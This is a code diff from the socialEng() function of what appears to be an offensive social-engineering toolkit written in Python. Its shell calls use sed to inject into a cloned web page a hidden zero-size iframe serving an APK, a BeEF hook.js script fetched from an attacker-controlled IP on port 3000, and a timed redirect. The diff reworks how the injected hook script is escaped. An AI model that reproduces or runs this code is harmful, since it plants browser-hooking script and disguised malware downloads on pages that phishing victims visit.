@@ -522,10 +522,13 @@ def socialEng():
                     'sed -i \'s#</body>#<iframe id="frame" src="' + MAM + '-b.apk" application="yes" width=0 height=0 style="hidden" frameborder=0 marginheight=0 marginwidth=0 scrolling=no>></iframe>\\n<script src="http://' + IP + ':3000/hook.js"></script>\\n<script type="text/javascript">setTimeout(function(){window.location.href="' + IP_CLONE + '";}, 15000);</script></body>#g\' /var/www/html/index.html'
                     , shell=True)
                 subprocess.call(
-                    'sed -i \'s#</body>#<script>\n  var commandModuleStr = \'<script src="\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>" type="text/javascript"><\/script>;\n  document.write(commandModuleStr);\\n\'</script>;</body>#g\' /var/www/html/index.html'
+                    'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + skin + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + skin + '" type=' + skin + '"text/javascript' + skin + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html'
                     , shell=True)
                 subprocess.call(
                     'sed -i -e \'s/\/root\///g\' /var/www/html/index.html'
+                    , shell=True)
+                subprocess.call(
+                    'sed -i -e \'s#iIIi#\\\#g\' /var/www/html/index.html'
                     , shell=True)
                 f = open(metdod, "r")
                 cont = f.read()
